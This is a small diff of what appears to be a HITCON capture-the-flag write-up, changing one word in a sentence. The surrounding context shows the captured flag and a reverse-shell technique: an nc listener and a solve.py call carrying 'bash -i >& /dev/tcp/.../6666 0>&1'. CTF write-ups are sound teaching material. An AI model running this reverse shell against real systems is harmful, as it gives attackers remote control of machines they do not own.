@@ -422,7 +422,7 @@ index.html           100% |*******************************| 12253   0:00:00 ETA
 hitcon{i_Am_s0_m155_s3e11sh0ck}
 ```
 
-Alternatively, you spawn a reverse shell by port-forwarding `6666` and running:
+Alternatively, you can spawn a reverse shell by port-forwarding `6666` and running:
 ```
 $ nc -lvp 6666
 $ python3 solve.py "bash -i >& /dev/tcp/75.188.17.80/6666 0>&1" remote
